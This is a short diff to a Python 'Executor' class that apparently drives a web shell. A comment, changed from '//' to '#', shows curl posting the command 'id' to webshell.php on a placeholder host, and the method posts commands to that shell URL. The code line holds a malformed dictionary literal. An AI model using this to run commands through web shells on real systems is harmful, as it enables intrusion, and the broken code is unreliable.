@@ -42,7 +42,7 @@ class Executor:
         await session.write_jsonrpc(req['id'], ret)
 
     async def execcmd(self, cmd):
-        // curl 'http://somewhere/webshell.php' -d 'cmd=id'
+        # curl 'http://somewhere/webshell.php' -d 'cmd=id'
         return await httpx.AsyncClient().post(self.shell, data={'cmd:cmd})
 
 
